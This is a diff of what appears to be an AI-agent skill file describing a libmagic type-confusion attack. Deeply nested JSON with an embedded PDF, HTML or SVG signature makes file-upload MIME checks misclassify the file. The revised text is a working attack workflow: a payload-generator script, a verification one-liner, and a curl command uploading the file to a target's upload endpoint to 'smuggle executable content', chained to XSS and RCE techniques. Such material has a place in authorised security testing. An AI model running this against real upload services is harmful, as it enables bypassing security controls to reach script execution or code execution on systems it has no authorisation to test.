@@ -1,91 +1,88 @@
 ---
 name: libmagic-type-confusion
-description: Bypass file type detection using libmagic's JSON nesting depth limit to force type confusion. Upload files that evade MIME checks by exploiting recursion guards in file or libmagic. Use when file uploads validate type via libmagic or the file command and you need to smuggle executable content.
+description: Bypass file type detection using libmagic's JSON nesting depth limit to force type confusion. Use when file uploads validate type via libmagic or the file command and you need to smuggle executable content past MIME checks.
 ---
 
 # libmagic Type Confusion via Deep JSON Nesting
 
 ## Pattern
-- The application validates upload type using `file` or libmagic bindings
-- Dangerous formats such as HTML, SVG, or script-capable content are blocked
-- A later processing stage handles the uploaded file based on the detected type
+- Application validates upload type using `file` or libmagic bindings
+- Dangerous formats (HTML, SVG, script-capable) are blocked
+- A later processing stage handles the uploaded file based on detected type
 
-## Root Cause
-libmagic's JSON detector includes a recursion guard:
+## Workflow
 
-```c
-if (lvl > 500) {
-    return 0;
-}
+### 1. Detect libmagic usage
+```bash
+# Check if target uses libmagic/file command for validation
+rg -i "finfo|magic_open|python-magic|ruby-filemagic|file_get_contents.*mime" --type py --type rb --type php src/
+
+# Check file command version (depth limit varies)
+file --version 2>&1 | head -1
 ```
 
-Once nesting exceeds the guard, libmagic stops treating the file as JSON. If another recognizable signature is embedded, classification may fall through to that type instead.
+**Checkpoint:** If target uses Node.js-only MIME, Apache Tika, or .NET-native detection, this technique does not apply.
 
-## Version Differences
+### 2. Determine depth threshold
 
-| Version | JSON depth limit | Notes |
-|---------|------------------|-------|
-| libmagic 5.41 | about 10 levels | easier to exploit |
-| libmagic 5.46+ | about 500 levels | requires deeper nesting |
+| Version | JSON depth limit | Nesting needed |
+|---------|------------------|----------------|
+| libmagic 5.41 | ~10 levels | easy |
+| libmagic 5.46+ | ~500 levels | 510+ levels |
 
-## Exploitation
-
-### Step 1: Generate nested JSON with an embedded signature
+### 3. Generate confused payload
 ```python
 #!/usr/bin/env python3
-import json
+import json, sys
 
 def make_payload(depth=510, target_sig="%PDF-1.4"):
     obj = "terminal"
     for i in range(depth):
         obj = {f"l{i}": obj}
     obj["_sig"] = target_sig + "\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF"
-    return json.dumps(obj)
+    with open("confused.json", "w") as f:
+        json.dump(obj, f)
+
+make_payload()
 ```
 
-### Step 2: Verify confusion locally
+### 4. Verify confusion locally
 ```bash
+python3 -c "
+import json
+obj = 'x'
+for i in range(510): obj = {f'l{i}': obj}
+obj['_sig'] = '%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF'
+open('confused.json','w').write(json.dumps(obj))
+"
 file confused.json
+# Expected: "PDF document" instead of "JSON data"
 ```
 
-### Step 3: Upload and trigger the downstream handler
-The goal is not just misclassification. Confirm the file reaches a parser, renderer, or execution path that trusts the reported type.
+**Checkpoint:** If `file` still reports JSON, increase depth or check version. If it reports the target type, proceed.
+
+### 5. Upload and trigger downstream handler
+```bash
+curl -x localhost:8080 -k "https://target.com/upload" \
+  -F "file=@confused.json;type=application/json"
+```
+
+The goal is not just misclassification -- confirm the file reaches a parser, renderer, or execution path that trusts the reported type.
 
 ## Practical Payloads
 
-### PDF smuggling
-Embed a PDF header and minimal PDF structure so the target routes it into a PDF pipeline.
+- **PDF smuggling**: embed `%PDF-1.4` header + minimal structure -> routes to PDF pipeline
+- **HTML smuggling**: on older libmagic, shallow nesting hides HTML/SVG from JSON detection
+- **SVG smuggling**: embed SVG signature for XSS via image processing pipelines
 
-### HTML smuggling
-On older libmagic versions, shallow nesting may be enough to hide HTML or SVG content from JSON detection.
-
-## Language and Library Coverage
-
-Affected when they inherit libmagic behavior:
-- C and C++
-- Perl
-- Ruby
-- PHP `finfo`
-- Python `python-magic`
-- Go wrappers around libmagic
-
-Usually not affected by this exact bug class:
-- Node.js-only MIME implementations
-- Java systems using Apache Tika
-- .NET-native MIME detection
-- Rust-native detection libraries
-
-## Testing Steps
-1. Determine whether the target uses libmagic or `file`.
-2. Identify the version if possible.
-3. Generate a nested JSON payload matching the target depth threshold.
-4. Embed the target type signature.
-5. Confirm both type confusion and downstream processing.
+## Affected Libraries
+- C/C++, Perl, Ruby, PHP `finfo`, Python `python-magic`, Go libmagic wrappers
+- NOT affected: Node.js-only MIME, Apache Tika, .NET-native detection, Rust-native detection
 
 ## Chain With
-- `dom-vulnerability-detection`
-- `write-path-to-rce`
-- `parser-differential-bypass`
+- `dom-vulnerability-detection` (if HTML/SVG smuggled)
+- `write-path-to-rce` (if file write achieved)
+- `parser-differential-bypass` (complementary technique)
 
 ## References
 - https://lab.ctbb.show/research/libmagic-inconsistencies-that-lead-to-type-confusion
